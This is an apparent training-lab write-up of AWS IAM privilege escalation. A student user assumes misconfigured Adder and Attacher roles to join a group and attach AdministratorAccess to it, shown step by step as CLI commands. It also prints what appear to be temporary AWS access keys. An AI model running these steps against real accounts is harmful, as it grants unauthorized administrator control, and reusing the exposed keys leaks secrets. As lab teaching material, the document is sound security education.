### Dangerous Policy Combination I

A pre requisite is to configure the profile generated by PT Academy

First, list attached policies for user `student` `aws iam list-attached-user-policies --user-name student --profile PTAcademyJllerena`

![image](https://user-images.githubusercontent.com/46797181/222631607-91c607e2-d4f8-44d0-b2a0-69bc1ae83bf7.png)

If a user is tried to be created, a denied message will be received ` aws iam create-user --user-name jllerena --profile PTAcademyJllerena`
![image](https://user-images.githubusercontent.com/46797181/222631842-3b8ccab1-7e4b-4419-b1d9-d56a74e7a51b.png)

What can be done is to get information about the userâ€™s inline policies and enumerate the attached policies.
```
aws iam list-user-policies --user-name student --profile PTAcademyJllerena
aws iam get-user-policy --user-name student --policy-name terraform-20230303041857712300000002 --profile PTAcademyJllerena

```
![image](https://user-images.githubusercontent.com/46797181/222632349-d106b9f1-db58-4a55-8206-2d3f93e537c8.png)

Check policies attached to Adder role and check the role-policy document for the policy `AddUser`.

```
aws iam list-role-policies --role-name Adder --profile PTAcademyJllerena
aws iam get-role-policy --role-name Adder --policy-name AddUser --profile PTAcademyJllerena

```
![image](https://user-images.githubusercontent.com/46797181/222633923-83a1ecab-e304-4a5c-8b57-d620720a7aba.png)

Assume Adder role with student user. `aws sts assume-role --role-arn arn:aws:iam::566111886431:role/Adder --role-session-name adder_jllerena --profile PTAcademyJllerena`
![image](https://user-images.githubusercontent.com/46797181/222636097-2ba838b6-375c-4e0b-8001-b6978538e0c8.png)

With this assume role lets store the credentials which can be in the env variables or in my case in the `~/.aws/credentials` path 

Lets add `student` user to `Printers` group `aws iam add-user-to-group --group-name Printers --user-name student --profile PTAJllerenaAssumedRole`

![image](https://user-images.githubusercontent.com/46797181/222640066-b390c175-2242-4f7a-8b60-3a47b89681d6.png)

Something important to notice is that this credentials storing in the `credentials` file gave an error, so the workaround was to store the values in env variables 
![image](https://user-images.githubusercontent.com/46797181/222640388-2eadecc4-e05b-4d8a-a339-21fcd857a5cc.png)

```
export AWS_ACCESS_KEY_ID=ASIA4FSZIQWHZGGDJ36G
export AWS_SECRET_ACCESS_KEY=NHaUFlUqtXoaJrCs9/HurXAN0MEuNEfKsm3Lzlov
export AWS_SESSION_TOKEN=IQoJ<rest of token>
aws iam add-user-to-group --group-name Printers --user-name student
```
Once added the user to the group the env variables can be unset 

```
unset AWS_ACCESS_KEY_ID
unset AWS_SECRET_ACCESS_KEY
unset AWS_SESSION_TOKEN
```
Listing the groups for user `student` will show that is added to `Printers` group `aws iam list-groups-for-user --user-name student --profile PTAcademyJllerena` 
![image](https://user-images.githubusercontent.com/46797181/222640832-5e52f352-4eb0-4a18-b8e4-d65acf906f88.png)

Repeat the above steps for `Attacher` role 

```
aws iam list-role-policies --role-name Attacher --profile PTAcademyJllerena
aws iam get-role-policy --role-name Attacher --policy-name AttachPolicy --profile PTAcademyJllerena
``` 
![image](https://user-images.githubusercontent.com/46797181/222641612-fcc9b90b-b42b-4d32-a4b8-650613e19933.png)

Above image shows that any policy can be added to the printers group. Lets find `Administrator` policy `aws iam list-policies --profile PTAcademyJllerena | grep 'AdministratorAccess' `

![image](https://user-images.githubusercontent.com/46797181/222642002-6ec8143a-8ff4-4203-b02d-95df7b46cb8d.png)

Next, assume `attacher` role `aws sts assume-role --role-arn arn:aws:iam::836632104335:role/Attacher --role-session-name attacher_jllerena --profile PTAcademyJllerena`  

![image](https://user-images.githubusercontent.com/46797181/222642732-2b513497-7d7c-487d-bc70-b5fe0e127c30.png)

Set the env variables for the assumed role credentials 

```
export AWS_ACCESS_KEY_ID=ASIA4FSZIQWHZGGDJ36G
export AWS_SECRET_ACCESS_KEY=NHaUFlUqtXoaJrCs9/HurXAN0MEuNEfKsm3Lzlov
export AWS_SESSION_TOKEN=IQoJ<rest of token>

```
Next, attach the `AdministratorAccess` policy to the `Printers` group and verify with below commands

Additionally `unset` the env variables  

```
aws iam attach-group-policy --group-name Printers --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam list-attached-group-policies --group-name Printers --profile PTAcademyJllerena

```
![image](https://user-images.githubusercontent.com/46797181/222643461-719f7cf8-93db-4f68-8c46-0cfdb5bc7372.png)

Create a user with `aws iam create-user --user-name jllerena --profile PTAcademyJllerena`

![image](https://user-images.githubusercontent.com/46797181/222643872-ff89d6d0-3cf0-4b73-b3ce-c9da5f8604cf.png)

In conclusion, `student` user is in `Printers` group which has `Administrator` permissions, this shows that privilege escalation has been achieved.
